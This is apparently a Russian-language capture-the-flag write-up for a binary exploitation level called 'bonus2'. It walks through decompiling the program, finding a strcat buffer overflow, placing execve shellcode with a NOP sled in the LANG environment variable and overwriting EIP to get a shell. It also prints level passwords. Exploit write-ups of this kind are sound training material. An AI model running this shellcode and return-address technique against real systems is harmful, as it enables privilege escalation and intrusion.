## HowTo
```
su bonus2
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

### Инструменты:
- Ida Pro + hex rays
- peda (gdb + patterns)

### Анализ и ход решения

1. Дизассемблируем при помощи IdaPro и получаем си-псевдокод

**main()**
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+0h] [ebp-ACh]
  char dest; // [esp+50h] [ebp-5Ch]
  int v6; // [esp+78h] [ebp-34h]
  char *v7; // [esp+9Ch] [ebp-10h]

  if ( argc != 3 )
    return 1;
  memset(&dest, 0, 0x4Cu);
  strncpy(&dest, argv[1], 0x28u);
  strncpy((char *)&v6, argv[2], 0x20u);
  v7 = getenv("LANG");
  if ( v7 )
  {
    if ( !memcmp(v7, "fi", 2u) )
    {
      language = 1;
    }
    else if ( !memcmp(v7, "nl", 2u) )
    {
      language = 2;
    }
  }
  qmemcpy(&v4, &dest, 0x4Cu);
  return greetuser(v4)
```

**greetuser()**
```
int __cdecl greetuser(char src)
{
  int v1; // ecx
  int v2; // edx
  int v3; // ecx
  int v4; // edx
  char dest; // [esp+10h] [ebp-48h]
  int v7; // [esp+14h] [ebp-44h]
  int v8; // [esp+18h] [ebp-40h]
  int v9; // [esp+1Ch] [ebp-3Ch]
  __int16 v10; // [esp+20h] [ebp-38h]
  char v11; // [esp+22h] [ebp-36h]

  switch ( language )
  {
    case 1:
      *(_DWORD *)&dest = unk_8048717;
      v7 = *((_DWORD *)&unk_8048717 + 1);
      v8 = *((_DWORD *)&unk_8048717 + 2);
      v9 = *((_DWORD *)&unk_8048717 + 3);
      v10 = *((_WORD *)&unk_8048717 + 8);
      v11 = *((_BYTE *)&unk_8048717 + 18);
      break;
    case 2:
      strcpy(&dest, "Goedemiddag! ");
      v3 = *(_DWORD *)"dag! ";
      v4 = *(unsigned __int16 *)" ";
      break;
    case 0:
      strcpy(&dest, "Hello ");
      v1 = *(unsigned __int16 *)"o ";
      v2 = (unsigned __int8)aHello[6];
      break;
  }
  strcat(&dest, &src);
  return puts(&dest);
}
```
2. Анализ функций

**main()**
- проверяет число аргументов (должно быть == `2`), затем создает буфер длиной `72`: `40 байт из argv[1] + 32 байта из argv[2]`.
- затем проверяет значение переменной окружения `LANG` (доступные значения `fi, nl, en`) и в соответветствии с ней выставляется значение `глобальной переменной language (0 - en, 1 - fi, 2 - nl)`
- затем вызывается `return greetuser()`

**Greetuser()**
- копирует приветствие (длина зависит от языка) в буфер размером `64`
- конкатенирует буфер с приветствием `(64)` с буфером с именем пользователя `(72)` при помощи `strcat`

3. Попробуем переполнить буфер в используя конкатенацию в `strcat`
```
> gdb ./bonus2
> patter create 40
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
> pattern create 32
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;A'

> run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa' 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;A'
Stopped reason: SIGSEGV
0x2d414143 in ?? ()
```
На английском языке `(LANG=en)` мне не удалось переполнить до смещения `eip`. 
Пробуя payload для 2-го аргумента сгенерированный через https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ 
и варьируя язык `(LANG=fi, LANG=nl)`, находим оффсет до `eip`
```
LANG=fi 18
LANG=nl 23
```

4. Для размещения `shell code` попробуем использовать переменную окружения - программа загружает значение из нее. 
Используем `shell code` и предыдущих взломов
```
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```

### Логика взлома:
- размещаем в `LANG` имя языка + `shell code`
- переполняем буфер `72 (40 + 32)`
- подменяем адрес `eip` на адрес переменной `LANG`
 
5. Размещаем в переменной `имя языка` + `слайс NOP-инструкций` + `shell code`
```
export LANG=$(python -c 'print("fi" + "\x90" * 20 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

7. Находим адрес переменной окружения `LANG`
```
> gdb ./bonus2
...
0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
...

> b *main+125
run 1 2
> x/s *(char**)environ + x) - эксперементально находим индекс в массиве environ, в котором хранится переменная LANG - в моем запуске +17

> (gdb) x/s *((char**)environ + 17)
0xbffffe74:	 "LANG=fi...shell_code"
```
8. Текущий адрес перменной `0xbffffe74`. 
Помним, что в ней лежит `lang_name + nop + shell`. Смещаем адрес на начало nop-инструкций (либо в произвольное их место).
Мое смещение `2` (длина fi / nl). Результирующий адрес `BFFFFE76 -> \x76\xfe\xff\xbf`

9. Готовим payload для обоих аргументов
#### Аргумент 1
- `'A' * 40` - просто заполняем буфер

#### Аргумент 2
- `'A' * 18` (для fi), либо `'A' * 23` (для nl)  `'\x76\xfe\xff\xbf'`

**Результирующий запуск**
```
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\x76\xfe\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBv���
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```